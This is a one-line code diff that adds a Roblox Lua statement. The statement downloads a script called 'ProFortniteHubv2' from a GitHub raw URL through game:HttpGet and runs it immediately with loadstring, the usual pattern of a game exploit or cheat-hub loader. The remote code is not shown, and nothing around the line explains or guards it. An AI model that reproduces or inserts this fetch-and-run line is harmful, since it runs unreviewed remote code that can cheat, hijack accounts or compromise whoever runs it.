@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Pls-Roka/ProFortniteHubv2/main/ProFortniteHubv2"), true))()
